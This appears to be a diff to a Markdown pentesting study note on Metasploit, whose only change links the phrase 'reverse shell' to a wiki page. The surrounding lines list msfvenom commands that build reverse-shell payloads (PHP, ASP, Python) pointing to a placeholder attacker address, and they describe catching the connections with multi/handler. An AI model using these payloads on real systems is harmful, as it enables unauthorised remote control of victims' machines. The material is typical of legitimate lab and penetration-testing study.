@@ -108,7 +108,7 @@ msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp
 msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py
 ```
-**You'll need to encode the options with the payload if you're aiming for a reverse shell (for example)**, like in the examples setting LHOST and LPORT in the `msfvenom` command.
+**You'll need to encode the options with the payload if you're aiming for a [[Reverse Shell]] (for example)**, like in the examples setting LHOST and LPORT in the `msfvenom` command.
 Once the payload is uploaded and running, you can use the `multi/handler` to handle incoming connections. **Don't forget to set the payload option accordingly.**
 ## Meterpreter
 Meterpreter is **a payload that supports the pentesting process with many components**. It runs on the target system, and acts as a way to interact with the target OS.
